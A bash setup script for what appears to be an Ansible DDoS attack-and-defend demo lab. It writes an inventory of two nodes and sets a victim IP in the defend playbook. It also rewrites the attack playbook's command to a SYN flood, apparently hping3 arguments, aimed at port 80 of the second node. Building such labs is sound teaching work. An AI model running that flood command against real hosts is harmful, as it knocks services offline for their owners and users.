#!/bin/bash

NODE1_PUBLIC_IP="$1"
NODE2_PUBLIC_IP="$2"

PLAYBOOK_FILE="$HOME/ansible-demo/ddos/ddos_defend.yaml"
ATTACK_PLAYBOOK_FILE="$HOME/ansible-demo/ddos/ddos_attack.yaml"
INVENTORY_FILE="$HOME/ansible-demo/inventory/hosts"

if [ -z "$NODE1_PUBLIC_IP" ] || [ -z "$NODE2_PUBLIC_IP" ]; then
  echo "Usage: $0 <node1_public_ip> <node2_public_ip>"
  exit 1
fi

if [ ! -f "$PLAYBOOK_FILE" ] || [ ! -f "$ATTACK_PLAYBOOK_FILE" ]; then
  echo "Error: Playbook file $PLAYBOOK_FILE or $ATTACK_PLAYBOOK_FILE does not exist!"
  exit 1
fi

if [ ! -f "$INVENTORY_FILE" ]; then
  echo "Error: Inventory file $INVENTORY_FILE does not exist!"
  exit 1
fi

# Debugging output
echo "Running sed command to update victim_ip in $PLAYBOOK_FILE"

# Use sed to replace victim_ip, ensuring correct indentation
sed -i.bak -e "s/^\(\s*\)victim_ip: .*/\1victim_ip: $NODE2_PUBLIC_IP/" "$PLAYBOOK_FILE"

echo "Updated 'victim_ip' in $PLAYBOOK_FILE to $NODE2_PUBLIC_IP"
echo "Contents of $PLAYBOOK_FILE after sed command:"
cat "$PLAYBOOK_FILE"

# Updating the ddos_attack.yaml command
echo "Updating ddos_attack.yaml with target IP $NODE2_PUBLIC_IP"
sed -i.bak -e "s/command: .*/command: '-c 10000 -d 120 -S -w 64 -p 80 --flood $NODE2_PUBLIC_IP'/" "$ATTACK_PLAYBOOK_FILE"

echo "Updated command in $ATTACK_PLAYBOOK_FILE:"
cat "$ATTACK_PLAYBOOK_FILE"

cat > "$INVENTORY_FILE" <<EOL
[local]
ansibleEngine ansible_connection=local

[nodes]
node1 ansible_host=${NODE1_PUBLIC_IP}
node2 ansible_host=${NODE2_PUBLIC_IP}
EOL

echo "Updated inventory file at $INVENTORY_FILE:"
cat "$INVENTORY_FILE"
